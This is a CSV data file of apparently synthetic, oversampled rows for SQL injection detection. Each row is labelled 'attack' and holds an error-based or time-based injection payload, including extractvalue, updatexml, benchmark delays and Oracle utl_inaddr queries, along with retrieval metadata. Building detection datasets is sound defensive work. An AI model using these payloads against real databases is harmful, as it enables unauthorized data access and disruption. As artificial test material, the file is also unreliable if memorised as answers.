id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000053,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000192,0.004723222209842456
SMOTE_000054,attack,error,"1 where 7757  =  7757 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000307,0.06582506761546666
SMOTE_000055,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000287,0.05782109637424572
SMOTE_000056,attack,error,"1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000107,0.6620802805387952
SMOTE_000057,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000279,0.1079473805837874
SMOTE_000058,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000014,1.798217887980425
SMOTE_000059,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.6474264041652761
SMOTE_000060,attack,error,"1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000142,0.309458403922643
SMOTE_000061,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000108,0.2431602677819646
SMOTE_000062,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000043,0.07020793569024059
SMOTE_000063,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000252,0.019513253279850647
SMOTE_000064,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000071,0.011110571679623198
SMOTE_000065,attack,error,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000196,0.47540857841484624
SMOTE_000066,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.21004195991564795
SMOTE_000067,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",nearest_attack_euclidean,R000202,1.3097649045533353
SMOTE_000068,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000224,0.588843227490189
SMOTE_000069,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,0.7117360755546166
SMOTE_000070,attack,error,"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000106,1.2167505953941535
SMOTE_000071,attack,error,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000110,0.8222695668981972
SMOTE_000072,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000286,0.4432812273494495
SMOTE_000073,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000218,0.7231690051006422
SMOTE_000074,attack,error,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000026,0.7343816892722496
SMOTE_000075,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000063,0.6068003727648049
SMOTE_000076,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.7709001466696848
SMOTE_000077,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'sqbr'  =  'sqbr",nearest_attack_euclidean,R000306,0.08911676004031209
SMOTE_000078,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000071,0.09490261122740479
SMOTE_000079,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000122,0.0
SMOTE_000080,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000223,1.3316064942973294
SMOTE_000081,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",nearest_attack_euclidean,R000231,0.42088013855066914
SMOTE_000082,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000064,0.05838802031677103
SMOTE_000083,attack,error,"1'   )    )    as ewsw where 4667  =  4667 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000196,0.47870471482101806
SMOTE_000084,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'zjnp'  =  'zjnp",nearest_attack_euclidean,R000247,0.2052490837319694
SMOTE_000085,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""onsd"" like ""onsd",nearest_attack_euclidean,R000127,1.7019528996850293
SMOTE_000086,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,0.0
SMOTE_000087,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000058,1.1712722242530431
SMOTE_000088,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000259,1.085881980343944
SMOTE_000089,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,0.5501650172762863
SMOTE_000090,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000126,0.32989202309752397
SMOTE_000091,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000300,1.2882646136465516
SMOTE_000092,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.3210182394296944
SMOTE_000093,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000093,0.0
SMOTE_000094,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000238,0.00970995538504258
SMOTE_000095,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000192,0.2674164292149661
SMOTE_000096,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",nearest_attack_euclidean,R000123,0.14714076924566633
SMOTE_000097,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000099,0.5548271782500865
SMOTE_000098,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,0.21763061612056336
SMOTE_000099,attack,error,"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000152,0.8096381368005451
SMOTE_000100,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000068,0.9732865259943858
SMOTE_000101,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",nearest_attack_euclidean,R000276,1.1924836575846214
SMOTE_000102,attack,error,"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000168,0.26234411980022404
SMOTE_000103,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,0.4875002878089164
SMOTE_000104,attack,error,"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000197,0.13529409720199123
SMOTE_000105,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000122,0.0062541236171392844
SMOTE_000106,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000097,0.005490465035845281
SMOTE_000107,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000076,0.6742112214204661
SMOTE_000108,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000146,0.3906731031778446
SMOTE_000109,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000248,1.200410129746254
SMOTE_000110,attack,error,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,nearest_attack_euclidean,R000091,0.648860881003636
